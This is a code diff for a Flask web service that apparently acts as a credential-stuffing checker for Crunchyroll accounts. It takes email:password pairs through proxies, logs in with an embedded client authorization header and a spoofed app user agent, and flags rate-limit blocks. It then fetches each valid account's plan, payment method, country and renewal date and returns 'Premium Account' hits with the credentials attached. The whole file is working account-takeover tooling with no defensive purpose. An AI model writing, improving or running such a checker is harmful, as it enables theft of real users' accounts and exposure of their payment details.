@@ -8,32 +8,6 @@ app = Flask(__name__)
 
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36"
 
-def translate_sku_to_plan(sku, amount, cycle_duration):
-    if not sku or sku == "N/A":
-        if amount and amount != "N/A" and float(amount) > 0:
-            if cycle_duration == "P1M":
-                if float(amount) <= 7.99:
-                    return "Fan"
-                elif float(amount) <= 9.99:
-                    return "Mega Fan"
-                elif float(amount) <= 15.99:
-                    return "Ultimate Fan"
-            elif cycle_duration == "P1Y":
-                return "Annual " + ("Fan" if float(amount) <= 79.99 else "Mega Fan" if float(amount) <= 99.99 else "Ultimate Fan")
-        return "Free"
-    sku = sku.lower()
-    plan_mapping = {
-        "fan": "Fan",
-        "mega": "Mega Fan",
-        "ultimate": "Ultimate Fan",
-        "premium": "Premium",
-        "free": "Free"
-    }
-    for key, value in plan_mapping.items():
-        if key in sku:
-            return value
-    return sku
-
 def format_proxy(proxy_string):
     if not proxy_string:
         return None
@@ -52,7 +26,52 @@ def format_proxy(proxy_string):
         return {"http": pstr, "https": pstr}
     return None
 
-def extract_crunchyroll_account_details(session, token, proxies=None, ua=None):
+def get_access_token(email, password, proxy=None):
+    session = requests.Session()
+    proxies = format_proxy(proxy) if proxy else None
+
+    common_headers = {
+        "Accept-Encoding": "gzip",
+        "Connection": "Keep-Alive",
+        "x-datadog-sampling-priority": "0",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "Referer": "https://www.crunchyroll.com/",
+        "Origin": "https://www.crunchyroll.com/",
+    }
+    auth_request_headers = {
+        **common_headers,
+        "User-Agent": "Crunchyroll/3.78.3 Android/9 okhttp/4.12.0",
+        "Authorization": "Basic bWZsbzhqeHF1cTFxeWJwdmY3cXA6VEFlTU9SRDBGRFhpdGMtd0l6TVVfWmJORVRRT2pXWXg=",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Host": "beta-api.crunchyroll.com",
+        "ETP-Anonymous-ID": "ccdcc444-f39c-48c3-9aa1-f72ebb93dfb1",
+    }
+    data = f"username={quote(email)}&password={quote(password)}&grant_type=password&scope=offline_access&device_id=14427c33-1893-4bc5-aaf3-dea072be2831&device_type=Chrome%20on%20Android"
+    try:
+        res = session.post(
+            "https://beta-api.crunchyroll.com/auth/v1/token",
+            headers=auth_request_headers, data=data, proxies=proxies, timeout=15
+        )
+        if res.status_code in [403, 429, 500, 502, 503]:
+            return None, "Blocked/RateLimited by Crunchyroll/Proxy.", session
+        if "invalid_credentials" in res.text:
+            return None, "Invalid Credentials.", session
+
+        try:
+            json_res = res.json()
+        except Exception:
+            return None, "Crunchyroll sent invalid JSON at login.", session
+
+        token = json_res.get("access_token")
+        if not token or json_res.get("error") or json_res.get("unsupported_grant_type"):
+            return None, "Invalid Credentials.", session
+
+        return token, None, session
+    except Exception as ex:
+        return None, f"Unknown Error: {ex}", session
+
+def fetch_web_account_details(session, token, email, password, proxies=None, ua=None):
     UA = ua or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36"
     me_headers = {
         "User-Agent": UA,
@@ -66,13 +85,13 @@ def extract_crunchyroll_account_details(session, token, proxies=None, ua=None):
             timeout=10
         )
         if me_res.status_code != 200:
-            return {}
+            return "Failed to fetch account ID.", None
         me_json = me_res.json()
         account_id = me_json.get("account_id")
         if not account_id:
-            return {}
-    except Exception:
-        return {}
+            return "No account_id in Crunchyroll response.", None
+    except Exception as e:
+        return f"Exception getting account ID: {e}", None
 
     subs_headers = {
         "Host": "www.crunchyroll.com",
@@ -89,15 +108,22 @@ def extract_crunchyroll_account_details(session, token, proxies=None, ua=None):
             timeout=20
         )
         if subs_res.status_code != 200:
-            return {}
+            return "Failed to fetch subscription details.", None
         data = subs_res.json()
-    except Exception:
-        return {}
+    except Exception as e:
+        return f"Exception fetching subs: {e}", None
 
     if data.get("containerType") == "free":
-        return {
-            "web_plan": "Free",
-            "web_status": "free"
+        msg = "❎ Free Account"
+        return msg, {
+            "Account": f"{email}:{password}",
+            "Country": "N/A",
+            "Plan": "Free",
+            "Payment": "N/A",
+            "Trial": "False",
+            "Status": "free",
+            "Renewal": "N/A",
+            "Days Left": "N/A"
         }
 
     subscriptions = data.get("subscriptions", [])
@@ -131,11 +157,9 @@ def extract_crunchyroll_account_details(session, token, proxies=None, ua=None):
             payment_info = payment_type
         else:
             payment_info = "N/A"
-        payment_method_type = payment_type
     else:
         payment_info = "N/A"
         country_code = "N/A"
-        payment_method_type = "N/A"
 
     if next_renewal_date not in ["N/A", "None"]:
         try:
@@ -153,157 +177,18 @@ def extract_crunchyroll_account_details(session, token, proxies=None, ua=None):
         formatted_renewal_date = next_renewal_date
         days_left = "N/A"
 
-    return {
-        "web_plan": f"{plan_text}—{plan_value}",
-        "web_payment": payment_info,
-        "web_country": country_code,
-        "web_trial": active_free_trial,
-        "web_status": status,
-        "web_renewal": formatted_renewal_date,
-        "web_days_left": days_left
+    msg = "✅ Premium Account" if status == "active" else "✅ Account Found"
+    details = {
+        "Account": f"{email}:{password}",
+        "Country": country_code,
+        "Plan": f"{plan_text}—{plan_value}",
+        "Payment": payment_info,
+        "Trial": "True" if active_free_trial == "True" else "False",
+        "Status": status,
+        "Renewal": formatted_renewal_date,
+        "Days Left": days_left
     }
-
-def crunchyroll_check(email, password, proxy=None):
-    session = requests.Session()
-    proxies = format_proxy(proxy) if proxy else None
-
-    plan = "Free"
-    amount = "N/A"
-    expiry = "N/A"
-    message = "Invalid or Free Account"
-    subscription_status = "Free"
-    free_trial = "No"
-    web_details = {}
-
-    common_headers = {
-        "Accept-Encoding": "gzip",
-        "Connection": "Keep-Alive",
-        "x-datadog-sampling-priority": "0",
-        "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
-        "Referer": "https://www.crunchyroll.com/",
-        "Origin": "https://www.crunchyroll.com/",
-    }
-    auth_request_headers = {
-        **common_headers,
-        "User-Agent": "Crunchyroll/3.78.3 Android/9 okhttp/4.12.0",
-        "Authorization": "Basic bWZsbzhqeHF1cTFxeWJwdmY3cXA6VEFlTU9SRDBGRFhpdGMtd0l6TVVfWmJORVRRT2pXWXg=",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Host": "beta-api.crunchyroll.com",
-        "ETP-Anonymous-ID": "ccdcc444-f39c-48c3-9aa1-f72ebb93dfb1",
-    }
-    data = f"username={quote(email)}&password={quote(password)}&grant_type=password&scope=offline_access&device_id=14427c33-1893-4bc5-aaf3-dea072be2831&device_type=Chrome%20on%20Android"
-
-    try:
-        res = session.post(
-            "https://beta-api.crunchyroll.com/auth/v1/token",
-            headers=auth_request_headers, data=data, proxies=proxies, timeout=15
-        )
-        if res.status_code in [403, 429, 500, 502, 503]:
-            return email, password, "Blocked/RateLimited by Crunchyroll/Proxy.", plan, amount, expiry, web_details
-        if "invalid_credentials" in res.text:
-            return email, password, "Invalid or Free Account.", plan, amount, expiry, web_details
-
-        try:
-            json_res = res.json()
-        except Exception:
-            return email, password, "Crunchyroll sent invalid JSON at login.", plan, amount, expiry, web_details
-
-        token = json_res.get("access_token")
-        if not token or json_res.get("error") or json_res.get("unsupported_grant_type"):
-            return email, password, "Invalid or Free Account.", plan, amount, expiry, web_details
-
-        auth_headers_subsequent = {
-            **common_headers,
-            "Authorization": f"Bearer {token}",
-            "User-Agent": UA,
-            "Host": "beta-api.crunchyroll.com",
-            "sec-ch-ua": "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
-            "sec-ch-ua-mobile": "?1",
-            "sec-ch-ua-platform": "\"Android\"",
-            "sec-fetch-site": "same-origin",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-dest": "empty",
-            "etp-anonymous-id": "64a91812-bb46-40ad-89ca-ff8bb567243d",
-        }
-
-        # Get user account ids
-        acc_res = session.get(
-            "https://beta-api.crunchyroll.com/accounts/v1/me",
-            headers=auth_headers_subsequent, proxies=proxies, timeout=10
-        )
-        user_id = "N/A"
-        external_id = "N/A"
-        if acc_res.status_code == 200:
-            try:
-                acc = acc_res.json()
-                user_id = acc.get("account_id", "N/A")
-                external_id = acc.get("external_id", "N/A")
-            except Exception:
-                pass
-
-        # Benefits endpoint (to get subscription status)
-        if external_id != "N/A":
-            benefits_res = session.get(
-                f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
-                headers=auth_headers_subsequent, proxies=proxies, timeout=10
-            )
-            if benefits_res.status_code == 200:
-                benefits_json = benefits_res.json()
-                benefits_total = benefits_json.get("total", 0)
-                if benefits_total > 0:
-                    subscription_status = "Active"
-                else:
-                    subscription_status = "Free"
-
-        # Subscriptions v3 (plan, amount, etc.)
-        if user_id != "N/A":
-            sub_v3_res = session.get(
-                f"https://beta-api.crunchyroll.com/subs/v3/subscriptions/{user_id}",
-                headers=auth_headers_subsequent, proxies=proxies, timeout=10
-            )
-            if sub_v3_res.status_code == 200:
-                sub_v3_json = sub_v3_res.json()
-                subscription_products = sub_v3_json.get("subscription_products", [])
-                sku = "N/A"
-                if subscription_products:
-                    product = subscription_products[0]
-                    sku = product.get("sku") or product.get("subscription_sku") or product.get("plan_id", "N/A")
-                    amount = str(product.get("amount", "N/A"))
-                else:
-                    sku = sub_v3_json.get("sku") or sub_v3_json.get("subscription_sku") or sub_v3_json.get("plan_id", "N/A")
-                    amount = str(sub_v3_json.get("amount", "N/A"))
-                cycle_duration = sub_v3_json.get("cycle_duration", "N/A")
-                plan = translate_sku_to_plan(sku, amount, cycle_duration)
-
-        # Subscriptions v1 (expiry)
-        if external_id != "N/A":
-            sub_v1_res = session.get(
-                f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}",
-                headers=auth_headers_subsequent, proxies=proxies, timeout=10
-            )
-            if sub_v1_res.status_code == 200:
-                sub_v1_json = sub_v1_res.json()
-                full_expiry_date_time = sub_v1_json.get("next_renewal_date")
-                if full_expiry_date_time:
-                    expiry = full_expiry_date_time.split("T")[0]
-                else:
-                    expiry = "N/A"
-                if sub_v1_json.get("has_free_trial", False) and subscription_status != "Active":
-                    free_trial = "Yes"
-
-        # Result decision
-        if free_trial == "Yes":
-            message = "Free Trial Account"
-        elif subscription_status == "Active" or (plan != "Free" and plan != "N/A"):
-            message = "Premium Account"
-        else:
-            message = "Invalid or Free Account"
-
-        web_details = extract_crunchyroll_account_details(session, token, proxies=proxies, ua=UA)
-        return email, password, message, plan, amount, expiry, web_details
-    except Exception as ex:
-        return email, password, f"Unknown Error: {ex}", plan, amount, expiry, {}
+    return msg, details
 
 @app.route("/check", methods=["GET", "POST"])
 def check():
@@ -316,30 +201,24 @@ def check():
     if not email or not password:
         return "❌ Missing email or password", 400
 
-    email, password, message, plan, amount, expiry, web_details = crunchyroll_check(email, password, proxy if proxy else None)
+    token, login_err, session = get_access_token(email, password, proxy if proxy else None)
+    if not token:
+        return f"❌ {email}:{password} - {login_err}", 200, {"Content-Type": "text/plain"}
 
-    # Which details to use (web or mobile)
-    display_plan = web_details.get("web_plan", plan)
-    display_payment = web_details.get("web_payment", "N/A")
-    display_country = web_details.get("web_country", "N/A")
-    display_trial = "True" if web_details.get("web_trial", "False") == "True" else "False"
-    display_status = web_details.get("web_status", "N/A")
-    display_renewal = web_details.get("web_renewal", expiry)
-    display_days = web_details.get("web_days_left", "N/A")
+    msg, details = fetch_web_account_details(session, token, email, password, proxies=format_proxy(proxy) if proxy else None, ua=UA)
+    if not details:
+        return f"❌ {email}:{password} - {msg}", 200, {"Content-Type": "text/plain"}
 
-    if display_plan.lower() == "free":
-        return f"❎ {email}:{password} - Free Account", 200, {"Content-Type": "text/plain"}
+    resp_str = f"""{msg}
 
-    resp_str = f"""✅ Premium Account
-
-Account: {email}:{password}
-Country: {display_country}
-Plan: {display_plan}
-Payment: {display_payment}
-Trial: {display_trial}
-Status: {display_status}
-Renewal: {display_renewal}
-Days Left: {display_days}
+Account: {details['Account']}
+Country: {details['Country']}
+Plan: {details['Plan']}
+Payment: {details['Payment']}
+Trial: {details['Trial']}
+Status: {details['Status']}
+Renewal: {details['Renewal']}
+Days Left: {details['Days Left']}
 """
     return resp_str, 200, {"Content-Type": "text/plain"}
 
